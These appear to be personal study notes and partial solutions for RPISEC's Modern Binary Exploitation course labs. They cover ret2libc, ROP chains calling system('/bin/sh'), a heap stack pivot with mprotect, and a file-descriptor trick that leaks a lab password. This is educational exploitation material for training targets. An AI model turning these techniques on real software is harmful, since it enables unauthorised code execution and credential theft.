Notes and some solutions for the course [Modern Binary Exploitation](https://github.com/RPISEC/MBE) by RPISEC 

# Memory Corruption

Use something like [fixenv](https://github.com/hellman/fixenv) so that the stack values are the same in gdb and direct execution.

# Dep and ROP

## ret2libc
With GEF, use p {function} and grep "string".

```bash
gef> p system
$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
gef> grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/lib/i386-linux-gnu/libc-2.19.so'(0xb7e23000-0xb7fcb000), permission=r-x
  0xb7f83a24 - 0xb7f83a2b ->  "/bin/sh"
```

## ROP

Classic ropper or ropgadget to get gadgets, useful in this case since "/bin/sh" is not in memory and we have to give it the string in the stack, we can set up a script that takes as argument an offset from the address of the stack we got in gdb.

```python
addr_binsh = 0xbffff6a0
addr_binsh -= int(sys.argv[1], 16)
```

```bash
$ python /var/tmp/lab5B.py 0x60
```
# ASLR

Pay attention to the loops

```c
char username[40]

for(int i = 0; i <= 40; i++){
// Do something with username
// 1 byte overflow
}
```

If you are not careful strncpy doesn't null terminate

```c
char username[32];
char readbuff[128];
int attempts = -3; // gcc compiles with int closer to ebp, doesn't seem to happen with clang


fgets(readbuff, sizeof(readbuff), stdin);
strncpy(username, readbuff, sizeof(username)); // No null termination
printf("User %s\n", username);
// It will print until it finds null byte, so it's an info leak
// if compiled with gcc it will also print "int attempts"
```

Remember how to call functions in ROP

```
junk+ret_address+fake_ret+arg1
Ex.
"A"*32+system_address+"AAAA"+addr_bin_sh
```

Be careful when things are getting zeroed and when they are not

```c
// This function is called repeatedly but
// only zeroes the struct at init so
// the second time you call it take into account
// that both user-->desc and user-->name are full
char temp[128];
memset(temp, 0, 128);
printf("Enter your name: ");
read(0, user->name, sizeof(user->name));
printf("Enter your description: ");
read(0, temp, sizeof(user->desc));
strncpy(user->desc, user->name,32);
strcat(user->desc, " is a ");
memcpy(user->desc + strlen(user->desc), temp, strlen(temp));
```

# Heap

Remember how does a used chunk and empty chunk look in memory, the metadata and all. Look at the lecture slides.

Useful to anotate state of the object confusion to see how to exploit

```c
//The structs look like this in memory right now:
struct data { //<-- program thinks object is struct data
   char reserved[8]; //--> always empty
   char buffer[20]; //--> "/bin/sh"+"\x00"*9 + small_num()
   void (* print)(char *); //--> small_str()
};

struct number {
   unsigned int reserved[6]; //--> "\x00"*8+"/bin/sh"+"\x00"*9
   void (* print)(unsigned int); //--> small_num()
   unsigned int num; //--> small_str()
};
```

Be aware of the division between ints, there are no decimals so numbers are truncated
(Ex. 7/4 = 1)

```c
#define MAX_BLOCKS 32
#define BLOCK_SIZE 4

struct msg {
    void (* print_msg)(struct msg *);
    unsigned int xor_pad[MAX_BLOCKS];
    unsigned int message[MAX_BLOCKS];
    unsigned int msg_len;
};
//if uint --> 131/4 = 32 (overflow 3 bytes)
if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS) 
        new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;
```

Use a one-gadget for stack pivot so that we can do some ROP

```python
expl += p32(0x0807e372) # add esp, 0x20; mov eax, esi; pop ebx; pop esi; ret
```

Use mprotect to make heap executable and jump to it

```python
num += p32(0x806f340)          # second gadget: __mprotect
num += p32(message_0 + 276)    # return: heap-address
num += p32(message_0 - 0x19d8) # memory-page heap
num += p32(0x22000)            # size = 0x22000
num += p32(0x7)                # prot = RWX
```

# Misc and Stack Cookies

Everything is a file in linux, if we control fd we can point it to a file that is not closed. [fd from parent processes are inherited by children]
```c
int fd1 = getfd(argv[1]); // getfd() uses the fd given or opens the file
int fd2 = getfd(argv[2]);
//...
struct fileComp* fc = comparefds(fd1, fd2);

printf( "\"%s\" is lexicographically %s \"%s\"\n",
   // securityCheck() checks if arg contains ".pass"
   securityCheck(argv[1], fc->fileContents1),
   fc->cmp > 0 ? "after" : (fc->cmp < 0 ? "before" : "equivalent to"),
   securityCheck(argv[2], fc->fileContents2));
```

To exploit we guess the fd to the ".pass" and open the ".pass" which gets blocked by securityCheck() but the file descriptor doesn't.

```bash
lab8C@warzone:/levels/lab08$ ./lab8C -fd=3 -fn=/home/lab8B/.pass
"3v3ryth1ng_Is_@_F1l3
" is lexicographically equivalent to "<<<For security reasons, your filename has been blocked>>>"
```